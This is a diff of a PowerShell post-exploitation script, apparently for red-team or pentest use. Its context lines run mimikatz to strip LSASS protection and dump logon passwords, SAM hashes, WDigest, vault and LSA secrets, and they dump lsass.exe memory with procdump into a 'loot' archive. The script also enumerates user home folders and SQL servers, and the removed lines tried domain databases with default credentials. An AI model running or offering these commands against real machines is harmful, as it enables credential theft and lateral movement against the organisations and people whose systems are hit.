@@ -7,23 +7,12 @@ catch {$_}
 ./mimikatz*/mimikatz.exe "token::elevate" "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "lsadump::sam" "sekurlsa::Credman" "sekurlsa::Wdigest" "vault::cred /patch" "lsadump::secrets" "exit" | tee mimikatz.txt
 ./procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
 Compress-Archive -LiteralPath C:/blood/lsass.dmp -DestinationPath C:/blood/loot/lsass.zip
+
 echo "ENUMERATING USERS HOME:"
 tree /F /A "C:/Users" | tee loot/home_tree
-echo "ENUMERATING DOMAIN SHARES:"
-Find-DomainShare | tee loot/domain_shares.txt
-echo "ENUMERATING DOMAIN FILE SERVERS:"
-Get-DomainFileServer | tee loot/domain_fileservers.txt
-
 echo "ENUMERATING LOCAL SQL DB:" | tee loot/local_sqldb.txt
 Get-SQLInstanceLocal >> loot/local_sqldb.txt
 Get-SQLInstanceLocal | Get-SQLServerInfo >> loot/local_sqldb.txt
-
-echo "ENUMERATING DOMAIN SQL DB:" | tee loot/domain_sqldb.txt
-Get-SQLInstanceDomain >> loot/domain_sqldb.txt
-echo "TRYING TO LOGIN AS $env:username TO THE ABOVE DATABASES:" >> loot/domain_sqldb.txt
-Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft >> loot/domain_sqldb.txt
-echo "TRYING DEFAULT CREDS TO THE ABOVE DATABASES:" >> loot/domain_sqldb.txt
-Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw  >> loot/domain_sqldb.txt
 
 Write-Host -NoNewline -ForegroundColor DarkGreen "`n [REMINDER] ---  ---  ---  ---  --- "
 Write-Host -ForegroundColor Yellow "CREDS USING METERPRETER:"
@@ -89,4 +78,3 @@ Write-Host -ForegroundColor Yellow "type C:\blood\loot\home_tree.txt"
 Write-Host -ForegroundColor Yellow "type C:\blood\loot\domain_shares.txt"
 Write-Host -ForegroundColor Yellow "type C:\blood\loot\domain_fileservers.txt"
 Write-Host -ForegroundColor Yellow "type C:\blood\loot\local_sqldb.txt"
-Write-Host -ForegroundColor Yellow "type C:\blood\loot\domain_sqldb.txt"
